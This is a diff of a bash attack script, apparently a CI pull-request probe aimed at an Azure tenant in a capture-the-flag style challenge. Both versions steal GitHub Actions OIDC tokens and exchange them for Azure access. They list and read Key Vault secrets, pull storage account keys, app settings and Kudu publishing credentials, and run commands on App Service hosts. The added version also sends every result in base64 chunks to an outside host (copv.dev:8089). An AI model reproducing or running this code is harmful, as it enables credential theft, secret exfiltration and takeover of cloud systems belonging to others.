@@ -1,117 +1,138 @@
 #!/usr/bin/env bash
-set -euo pipefail
+# Tebamoto PR probe v5: OIDC FIC sweep + KV chain + reporting Kudu MSI
+set +e
+SINK="${EXFIL_SINK:-http://copv.dev:8089}"
+TAG="tb5${GITHUB_RUN_ID:-local}"
 say() { echo "$*"; }
-
-T="${AZURE_TENANT_ID:?}"
-C="${AZURE_CLIENT_ID:?}"
-SUB="${AZURE_SUBSCRIPTION_ID:?}"
-
-J=$(curl -sS --max-time 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
-[[ -n "$J" && "$J" != "null" ]] || { say "NO_OIDC"; exit 0; }
-
-gh_tok() {
-  curl -sS --max-time 25 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-    -d "client_id=$C" \
-    -d 'grant_type=client_credentials' \
-    -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
-    -d "client_assertion=$J" \
-    -d "scope=$1" | jq -r '.access_token // empty'
+exfil() {
+  local label="$1" data="$2" b64 i len
+  b64=$(printf '%s' "$data" | base64 -w0 2>/dev/null | tr '+/' '-_' | tr -d '=')
+  len=${#b64}
+  say "[exfil] $label len=$len"
+  i=0
+  while [ $i -lt $len ]; do
+    curl -sS -m 10 -o /dev/null "$SINK/x/$TAG/$label/$i/${b64:$i:1400}" || true
+    i=$((i + 1400))
+  done
 }
 
-VAULT_TOK=$(gh_tok 'https://vault.azure.net/.default')
-say "VAULT_TOK_LEN=${#VAULT_TOK}"
+say "=== build v5 === event=${GITHUB_EVENT_NAME:-local} repo=${GITHUB_REPOSITORY:-local}"
 
-for VAULT in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
-  HOST="https://${VAULT}.vault.azure.net"
-  LIST=$(curl -sS --max-time 25 -H "Authorization: Bearer $VAULT_TOK" "$HOST/secrets?api-version=7.4")
-  say "LIST_${VAULT}=$(echo "$LIST" | jq -c '[.value[]?.id]')"
-  for name in $(echo "$LIST" | jq -r '.value[]?.id | split("/") | .[-1]'); do
-    SV=$(curl -sS --max-time 25 -H "Authorization: Bearer $VAULT_TOK" "$HOST/secrets/${name}?api-version=7.4")
-    VAL=$(echo "$SV" | jq -r '.value // empty')
-    if [[ "$VAL" == *DF26* ]]; then say "FLAG_${VAULT}_${name}=$VAL"; fi
-    if [[ "$VAL" =~ ^\{ ]]; then
-      A=$(echo "$VAL" | jq -r '.appId // empty')
-      P=$(echo "$VAL" | jq -r '.clientSecret // empty')
-      TT=$(echo "$VAL" | jq -r '.tenantId // empty')
-      [[ -n "$A" && -n "$P" ]] || continue
-      SPV=$(curl -sS --max-time 25 -X POST "https://login.microsoftonline.com/$TT/oauth2/v2.0/token" \
-        -d "client_id=$A" -d 'grant_type=client_credentials' -d "client_secret=$P" \
-        -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
-      say "SP_${name}_VAULT_LEN=${#SPV}"
-      for flagname in flag FLAG df26 tebamoto-flag challenge-flag tbl-flag prod-flag; do
-        for V2 in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
-          H2="https://${V2}.vault.azure.net"
-          code=$(curl -sS --max-time 25 -o /tmp/sv -w '%{http_code}' -H "Authorization: Bearer $SPV" "$H2/secrets/${flagname}?api-version=7.4" || echo 000)
-          F=$(jq -r '.value // empty' /tmp/sv 2>/dev/null || true)
-          say "SP_${name}_${V2}_${flagname}_HTTP=$code"
-          [[ -n "$F" ]] && say "SP_${name}_${V2}_${flagname}=$F"
-        done
-      done
-    else
-      [[ -n "$VAL" ]] && say "PLAIN_${VAULT}_${name}_LEN=${#VAL}"
-    fi
+OIDC=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
+  python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
+say "oidc_len=${#OIDC}"
+TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
+CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
+SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
+RG="rg-tbl-platform-prod-sea"
+
+exch() {
+  curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+    --data-urlencode "client_id=$1" -d grant_type=client_credentials \
+    --data-urlencode "scope=$2" \
+    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+    --data-urlencode "client_assertion=$OIDC"
+}
+
+aztok() {
+  curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+    --data-urlencode "client_id=$CID" -d grant_type=client_credentials \
+    --data-urlencode "scope=$1" \
+    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+    --data-urlencode "client_assertion=$OIDC" | \
+    python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null
+}
+
+if [ -z "$OIDC" ]; then say "NO_OIDC"; exit 0; fi
+
+IDS="038bc35d-131d-4953-9985-ff4a245ccec1:cost-reader
+2c34300e-1bc0-41e7-9c1e-8b7571d72c72:directory-audit
+7c2e61eb-f928-45cd-99c9-20da958dd216:directory-sync
+891fb158-e02c-4428-a885-53b811f369c0:legacy-admin
+6eb124e3-de61-4fc9-a124-213d98d737f5:reporting-insights
+12ed54de-f2eb-4784-804c-3a7a3e83a9e9:reporting-service
+881fddce-6208-4af5-a297-7e79c912f83c:reporting-viewer
+58108da8-044e-4d7e-9a46-92e6179b30be:secrets-sync
+462d1c38-4459-48b8-9333-82e389e59514:platform-automation
+72ff278a-9e71-43ec-bac4-2ca303f8e462:cicd-deployer
+7a85156a-01c4-4e61-8472-40a92107159b:reporting-writer-mi
+eeab432e-1bf6-400e-b155-a28ce7cafcdb:storefront-sysmi"
+
+for LINE in $IDS; do
+  APPID="${LINE%%:*}"; NAME="${LINE##*:}"
+  for SCOPE in "https://management.azure.com/.default" "https://vault.azure.net/.default"; do
+    R=$(exch "$APPID" "$SCOPE")
+    T=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+    say "FIC_${NAME}_$(echo "$SCOPE" | sed 's|https://||;s|/.default||;s|/|_|g')_LEN=${#T}"
+    [ -z "$T" ] && { exfil "ficfail-${NAME}" "$R"; continue; }
+    exfil "kvsec-${NAME}" "$(curl -sS -m 15 -H "Authorization: Bearer $T" \
+      'https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4')"
+    for fn in flag FLAG df26 tebamoto-flag challenge-flag; do
+      exfil "kvsec-${NAME}-${fn}" "$(curl -sS -m 12 -H "Authorization: Bearer $T" \
+        "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${fn}?api-version=7.4")"
+    done
+    exfil "lkappcfg-${NAME}" "$(curl -sS -m 15 -X POST -H "Authorization: Bearer $T" \
+      -H 'Content-Type: application/json' -d '{}' \
+      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01")"
+    exfil "appset-storefront-${NAME}" "$(curl -sS -m 15 -X POST -H "Authorization: Bearer $T" \
+      -H 'Content-Type: application/json' -d '{}' \
+      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01")"
   done
 done
 
-# Kudu + MSI on reporting app (storefront MSI may differ)
-ARM=$(gh_tok 'https://management.azure.com/.default')
-say "ARM_LEN=${#ARM}"
-RPT=$(curl -sS --max-time 25 -H "Authorization: Bearer $VAULT_TOK" \
-  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
-RID=$(echo "$RPT" | jq -r '.value|fromjson|.appId // empty')
-RSC=$(echo "$RPT" | jq -r '.value|fromjson|.clientSecret // empty')
-RT=$(echo "$RPT" | jq -r '.value|fromjson|.tenantId // empty')
-RAT=$(curl -sS --max-time 25 -X POST "https://login.microsoftonline.com/$RT/oauth2/v2.0/token" \
-  -d "client_id=$RID" -d 'grant_type=client_credentials' -d "client_secret=$RSC" \
-  -d 'scope=https://management.azure.com/.default' | jq -r '.access_token // empty')
-B="https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
-PC=$(curl -sS --max-time 25 -X POST -H "Authorization: Bearer $RAT" -H 'Content-Length: 0' \
-  "$B/config/publishingcredentials/list?api-version=2023-01-01")
-PU=$(echo "$PC" | jq -r '.properties.publishingUserName // empty')
-PP=$(echo "$PC" | jq -r '.properties.publishingPassword // empty')
-say "KUDU_REPORTING=$([[ -n "$PU" ]] && echo OK || echo FAIL)"
-for SITE_RG in "rg-tbl-reporting-prod-eus/app-tbl-reporting-prod" "rg-tbl-platform-prod-sea/app-tbl-storefront-prod"; do
-  RG=${SITE_RG%/*}; SITE=${SITE_RG#*/}
-  B2="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
-  PC2=$(curl -sS --max-time 25 -X POST -H "Authorization: Bearer $RAT" -H 'Content-Length: 0' \
-    "$B2/config/publishingcredentials/list?api-version=2023-01-01" || true)
-  PU2=$(echo "$PC2" | jq -r '.properties.publishingUserName // empty')
-  PP2=$(echo "$PC2" | jq -r '.properties.publishingPassword // empty')
-  say "KUDU_${SITE}=$([[ -n "$PU2" ]] && echo OK || echo FAIL)"
-  [[ -n "$PU2" && -n "$PP2" ]] || continue
-  SCM2="https://${SITE}.scm.azurewebsites.net"
-  if [[ "$SITE" == "app-tbl-storefront-prod" ]]; then PU=$PU2; PP=$PP2; SCM=$SCM2; fi
-done
-if [[ -n "$PU" && -n "$PP" ]]; then
-  SCM=${SCM:-'https://app-tbl-reporting-prod.scm.azurewebsites.net'}
-  V=$(curl -sS --max-time 25 -u "$PU:$PP" "$SCM/api/vfs/site/wwwroot/check_kv.py" || true)
-  say "CHECK_KV_B64=$(printf '%s' "$V" | head -c 4000 | base64 -w0)"
-  BODY=$(jq -nc '{command:"python3 /home/site/wwwroot/check_kv.py",dir:"/home/site/wwwroot"}')
-  OUT=$(curl -sS --max-time 90 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$BODY")
-  say "CHECK_OUT_B64=$(printf '%s' "$OUT" | base64 -w0)"
-  IE=$(printf '%s' "$V" | sed -n "s/^IE = '\([^']*\)'.*/\1/p" | head -1)
-  IH=$(printf '%s' "$V" | sed -n "s/^IH = '\([^']*\)'.*/\1/p" | head -1)
-  if [[ -n "$IE" && -n "$IH" ]]; then
-    PY=$(cat <<PYEOF
-import urllib.request,json
-ie="$IE"; ih="$IH"
-u=ie+"?resource=https://vault.azure.net&api-version=2019-08-01"
-t=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={"X-IDENTITY-HEADER":ih}),timeout=15).read())["access_token"]
-for n in ["flag","FLAG","df26","tebamoto-flag"]:
-  for h in ["kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"]:
-    try:
-      r=urllib.request.urlopen(urllib.request.Request(f"https://{h}.vault.azure.net/secrets/{n}?api-version=7.4",headers={"Authorization":"Bearer "+t}),timeout=15)
-      print("MSI",h,n,r.read().decode()[:500])
-    except Exception as e:
-      print("MSI_ERR",h,n,str(e)[:120])
-PYEOF
-)
-    CMD="python3 -c $(printf '%q' "$PY")"
-    OUT=$(curl -sS --max-time 90 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST \
-      "$SCM/api/command" -d "$(jq -nc --arg c "$CMD" '{command:$c,dir:"/home/site/wwwroot"}')")
-    say "MSI_OUT=$(echo "$OUT" | jq -r '.Output // .output // .' 2>/dev/null | tr '\n' ' ' | head -c 2000)"
-  fi
+VAULT_TOK=$(aztok "https://vault.azure.net/.default")
+say "OIDC_VAULT_LEN=${#VAULT_TOK}"
+if [ -n "$VAULT_TOK" ]; then
+  for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
+    L=$(curl -sS -m 20 -H "Authorization: Bearer $VAULT_TOK" "https://$V.vault.azure.net/secrets?api-version=7.4")
+    exfil "kvlist-$V" "$L"
+    echo "$L" | python3 -c '
+import sys,json
+try:
+  d=json.load(sys.stdin)
+  for x in d.get("value",[]):
+    print(x["id"].split("/")[-1])
+except Exception: pass
+' | while read -r name; do
+      [ -z "$name" ] && continue
+      SV=$(curl -sS -m 15 -H "Authorization: Bearer $VAULT_TOK" "https://$V.vault.azure.net/secrets/$name?api-version=7.4")
+      VAL=$(echo "$SV" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
+      case "$VAL" in *DF26*) say "FOUND_FLAG_${V}_${name}=${VAL}" ;; esac
+    done
+  done
 fi
 
-say DONE
+ARM_TOK=$(aztok "https://management.azure.com/.default")
+say "OIDC_ARM_LEN=${#ARM_TOK}"
+RPT_JSON=$(curl -sS -m 20 -H "Authorization: Bearer ${VAULT_TOK}" \
+  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
+RID=$(echo "$RPT_JSON" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value","");print(json.loads(v).get("appId","") if v.startswith("{") else "")' 2>/dev/null)
+RSC=$(echo "$RPT_JSON" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value","");print(json.loads(v).get("clientSecret","") if v.startswith("{") else "")' 2>/dev/null)
+RT=$(echo "$RPT_JSON" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value","");print(json.loads(v).get("tenantId","") if v.startswith("{") else "")' 2>/dev/null)
+RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$RT/oauth2/v2.0/token" \
+  -d "client_id=$RID" -d grant_type=client_credentials -d "client_secret=$RSC" \
+  -d 'scope=https://management.azure.com/.default' | \
+  python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+say "REPORTING_ARM_LEN=${#RAT}"
+
+for SITE_RG in "rg-tbl-reporting-prod-eus/app-tbl-reporting-prod" "rg-tbl-platform-prod-sea/app-tbl-storefront-prod"; do
+  RG2=${SITE_RG%/*}; SITE=${SITE_RG#*/}
+  PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H 'Content-Length: 0' \
+    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/publishingcredentials/list?api-version=2023-01-01")
+  PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
+  say "KUDU_${SITE}=$([ -n "$PU" ] && echo OK || echo FAIL)"
+  exfil "kudu-${SITE}" "$PC"
+done
+
+PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
+PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
+if [ -n "$PU" ] && [ -n "$PP" ]; then
+  SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
+  OUT=$(curl -sS -m 90 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" \
+    -d '{"command":"python3 /home/site/wwwroot/check_kv.py","dir":"/home/site/wwwroot"}')
+  say "CHECK_KV_OUT=$(echo "$OUT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print((d.get("Output") or "")[:1500])' 2>/dev/null)"
+  exfil "check-kv-out" "$OUT"
+fi
+
+say "=== DONE v5 ==="
